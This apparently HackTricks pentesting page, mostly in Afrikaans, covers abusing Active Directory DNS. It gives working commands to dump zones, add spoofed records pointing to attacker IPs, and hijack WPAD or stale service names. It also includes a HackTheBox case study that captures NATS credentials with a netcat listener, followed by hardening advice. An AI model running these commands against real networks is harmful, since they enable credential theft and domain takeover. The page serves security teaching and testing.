# AD DNS Records

{{#include ../../banners/hacktricks-training.md}}

Standaard kan **enige gebruiker** in Active Directory **enumerate all DNS records** in die Domain of Forest DNS zones, soortgelyk aan 'n zone transfer (gebruikers kan die child objects van 'n DNS zone in 'n AD environment lys).

Die tool [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) maak **enumeration** en **exporting** van **all DNS records** in die sone moontlik vir recon-doeleindes van interne netwerke.
```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```
>  adidnsdump v1.4.0 (April 2025) voeg JSON/Greppable (`--json`) uitvoer, meerdraadse DNS-resolusie en ondersteuning vir TLS 1.2/1.3 by wanneer dit aan LDAPS gebind word

Vir meer inligting lees [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

---

## Skep / Wysig rekords (ADIDNS spoofing)

Omdat die **Authenticated Users** groep standaard **Create Child** op die zone DACL het, kan enige domeinrekening (of rekenaarrekening) bykomende rekords registreer. Dit kan gebruik word vir verkeeroorname, NTLM relay coercion of selfs tot volledige kompromittering van die domein.

### PowerMad / Invoke-DNSUpdate (PowerShell)
```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```
### Impacket – dnsupdate.py  (Python)
```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```
*(dnsupdate.py word saam met Impacket ≥0.12.0 verskaf)*

### BloodyAD
```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```
---

## Algemene aanvalsprimitiewe

1. **Wildcard record** – `*.<zone>` skakel die AD DNS-server in 'n onderneming-wye responder, soortgelyk aan LLMNR/NBNS spoofing. Dit kan misbruik word om NTLM-hashe te vang of om dit na LDAP/SMB te relay. (Vereis dat WINS-lookup gedeaktiveer is.)
2. **WPAD hijack** – voeg `wpad` by (of 'n **NS** record wat na 'n aanvaller-host wys om die Global-Query-Block-List te omseil) en tree deursigtig as proxy op vir uitgaande HTTP-versoeke om credentials te oes. Microsoft het die wildcard/DNAME-omseilings gepatch (CVE-2018-8320) maar **NS-records werk steeds**.
3. **Stale entry takeover** – eis die IP-adres wat voorheen aan 'n workstation behoort het en die geassosieerde DNS-inskrywing sal steeds oplos, wat resource-based constrained delegation of Shadow-Credentials-aanvalle moontlik maak sonder om DNS te raak.
4. **DHCP → DNS spoofing** – op 'n standaard Windows DHCP+DNS-implementering kan 'n ongeverifieerde aanvaller op dieselfde subnet enige bestaande A-record oorskryf (insluitend Domain Controllers) deur vervalste DHCP-versoeke te stuur wat dinamiese DNS-opdaterings aktiveer (Akamai “DDSpoof”, 2023). Dit gee machine-in-the-middle oor Kerberos/LDAP en kan lei tot volledige domeinoorname.
5. **Certifried (CVE-2022-26923)** – verander die `dNSHostName` van 'n machine account wat jy beheer, registreer 'n ooreenstemmende A-record, en versoek dan 'n sertifikaat vir daardie naam om die DC te imiter. Tools soos **Certipy** of **BloodyAD** outomatiseer die proses volledig.

---

### Internal service hijacking via stale dynamic records (NATS case study)

Wanneer dinamiese opdaterings oop bly vir alle geverifieerde gebruikers, kan **'n gederegistreerde diensnaam her-eis word en na aanvaller-infrastruktuur gewys word**. Die Mirage HTB DC het die hostname `nats-svc.mirage.htb` blootgestel ná DNS scavenging, sodat enige laaggeprivilegieerde gebruiker kon:

1. **Bevestig dat die rekord ontbreek** en die SOA met `dig` uitvind:
```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```
2. **Herskep die rekord** na 'n eksterne/VPN-koppelvlak wat hulle beheer:
```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```
3. **Impersonate the plaintext service**. NATS-kliente verwag om een `INFO { ... }` banner te sien voordat hulle inlogbewyse stuur, dus is die kopie van ’n geldige banner vanaf die werklike broker voldoende om geheime te versamel:
```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```
Enige kliënt wat die gehijackte naam oplos sal onmiddellik sy JSON `CONNECT`-frame (insluitend `"user"`/`"pass"`) na die luisteraar leak. Die uitvoering van die amptelike `nats-server -V` binary op die aanvaller-host, die deaktivering van sy log redaction, of bloot die sniffing van die sessie met Wireshark lewer dieselfde plaintext credentials omdat TLS opsioneel was.

4. **Pivot with the captured creds** – in Mirage het die gesteelde NATS-rekening JetStream-toegang verskaf, wat historiese authentication events blootgestel het wat herbruikbare AD usernames/passwords bevat het.

This pattern applies to every AD-integrated service that relies on unsecured TCP handshakes (HTTP APIs, RPC, MQTT, etc.): once the DNS record is hijacked, the attacker becomes the service.

---

## Opsporing & verharding

* Weier **Authenticated Users** die reg *Create all child objects* op sensitiewe zones en delegeer dynamic updates aan 'n toegewyde rekening wat deur DHCP gebruik word.
* As dynamic updates vereis word, stel die zone op **Secure-only** en aktiveer **Name Protection** in DHCP sodat slegs die owner computer object sy eie rekord kan oorskryf.
* Moniteer DNS Server event IDs 257/252 (dynamic update), 770 (zone transfer) en LDAP writes na `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Blokkeer gevaarlike name (`wpad`, `isatap`, `*`) met 'n opsetlik-goeie rekord of via die Global Query Block List.
* Hou DNS servers gepatch – bv. RCE bugs CVE-2024-26224 en CVE-2024-26231 het **CVSS 9.8** bereik en is op afstand eksploiteerbaar teen Domain Controllers.



## References

- Kevin Robertson – “ADIDNS Revisited – WPAD, GQBL and More”  (2018, nog steeds die de-facto verwysing vir wildcard/WPAD-aanvalle)
- Akamai – “Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates” (Dec 2023)
- [HackTheBox Mirage: Chaining NFS Leaks, Dynamic DNS Abuse, NATS Credential Theft, JetStream Secrets, and Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
{{#include ../../banners/hacktricks-training.md}}
